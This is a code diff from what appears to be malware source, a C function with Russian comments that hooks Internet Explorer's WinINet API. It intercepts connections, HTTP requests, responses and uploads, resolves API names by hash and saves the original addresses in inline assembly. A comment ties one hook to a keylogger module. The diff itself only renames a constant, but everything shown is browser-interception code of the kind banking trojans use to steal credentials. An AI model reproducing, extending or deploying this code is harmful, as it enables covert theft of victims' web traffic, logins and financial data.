@@ -1495,94 +1495,94 @@ bool HookInternetExplorerApi() {
 
 	IEDBG("Ставим хуки");
 
-	if (HookApi(8, Hash_InternetConnectA, &HOOK_InternetConnectA))
+	if (HookApi(DLL_WININET, Hash_InternetConnectA, &HOOK_InternetConnectA))
 	{
 		__asm mov[REAL_InternetConnectA], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, Hash_InternetConnectW, &HOOK_InternetConnectW))
+	if (HookApi(DLL_WININET, Hash_InternetConnectW, &HOOK_InternetConnectW))
 	{
 		__asm mov[REAL_InternetConnectW], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_HttpSendRequestA, &HOOK_HttpSendRequestA))
+	if (HookApi(DLL_WININET, dwHash_HttpSendRequestA, &HOOK_HttpSendRequestA))
 	{
 		__asm mov[REAL_HttpSendRequestA], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_HttpSendRequestW, &HOOK_HttpSendRequestW)) {
+	if (HookApi(DLL_WININET, dwHash_HttpSendRequestW, &HOOK_HttpSendRequestW)) {
 		__asm mov[REAL_HttpSendRequestW], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_HttpSendRequestExA, &HOOK_HttpSendRequestExA)
+	if (HookApi(DLL_WININET, dwHash_HttpSendRequestExA, &HOOK_HttpSendRequestExA)
 		) {
 		__asm mov[REAL_HttpSendRequestExA], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_HttpSendRequestExW, &HOOK_HttpSendRequestExW)
+	if (HookApi(DLL_WININET, dwHash_HttpSendRequestExW, &HOOK_HttpSendRequestExW)
 		) {
 		__asm mov[REAL_HttpSendRequestExW], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_InternetReadFile, &HOOK_InternetReadFile)) {
+	if (HookApi(DLL_WININET, dwHash_InternetReadFile, &HOOK_InternetReadFile)) {
 		__asm mov[REAL_InternetReadFile], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_InternetReadFileExA,
+	if (HookApi(DLL_WININET, dwHash_InternetReadFileExA,
 			&HOOK_InternetReadFileExA)) {
 		__asm mov[REAL_InternetReadFileExA], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_InternetReadFileExW,
+	if (HookApi(DLL_WININET, dwHash_InternetReadFileExW,
 			&HOOK_InternetReadFileExW)) {
 		__asm mov[REAL_InternetReadFileExW], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_InternetQueryDataAvailable,
+	if (HookApi(DLL_WININET, dwHash_InternetQueryDataAvailable,
 			&HOOK_InternetQueryDataAvailable)) {
 		__asm mov[REAL_InternetQueryDataAvailable], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, dwHash_InternetCloseHandle, &HOOK_InternetCloseHandle)) {
+	if (HookApi(DLL_WININET, dwHash_InternetCloseHandle, &HOOK_InternetCloseHandle)) {
 		__asm mov[REAL_InternetCloseHandle], eax
 	}
 	else
 		return false;
 
-	if (HookApi(8, Hash_HttpOpenRequestA, &HOOK_HttpOpenRequestA)) {
+	if (HookApi(DLL_WININET, Hash_HttpOpenRequestA, &HOOK_HttpOpenRequestA)) {
 		__asm mov[REAL_HttpOpenRequestA], eax
 	}
 
-	if (HookApi(8, Hash_HttpOpenRequestW, &HOOK_HttpOpenRequestW)) {
+	if (HookApi(DLL_WININET, Hash_HttpOpenRequestW, &HOOK_HttpOpenRequestW)) {
 		__asm mov[REAL_HttpOpenRequestW], eax
 	}
 
 
-	if (HookApi(8, Hash_HttpQueryInfoA, &HOOK_HttpQueryInfoA)) {
+	if (HookApi(DLL_WININET, Hash_HttpQueryInfoA, &HOOK_HttpQueryInfoA)) {
 		__asm mov[REAL_HttpQueryInfoA], eax
 	}
 
-	if (HookApi(8, Hash_HttpQueryInfoW, &HOOK_HttpQueryInfoW)) {
+	if (HookApi(DLL_WININET, Hash_HttpQueryInfoW, &HOOK_HttpQueryInfoW)) {
 		__asm mov[REAL_HttpQueryInfoW], eax
 	}
 
@@ -1590,7 +1590,7 @@ bool HookInternetExplorerApi() {
 	// Перехват функции делаем только при включенном кейлогере и отключенном
 	// модуле BSS
 	#if defined(UniversalKeyLoggerH) && !defined(BSSH)
-	if ( HookApi( 8, Hash_InternetWriteFile, &HOOK_InternetWriteFile ) )
+	if ( HookApi( DLL_WININET, Hash_InternetWriteFile, &HOOK_InternetWriteFile ) )
 	{
 		__asm mov [REAL_InternetWriteFile], eax
 	}
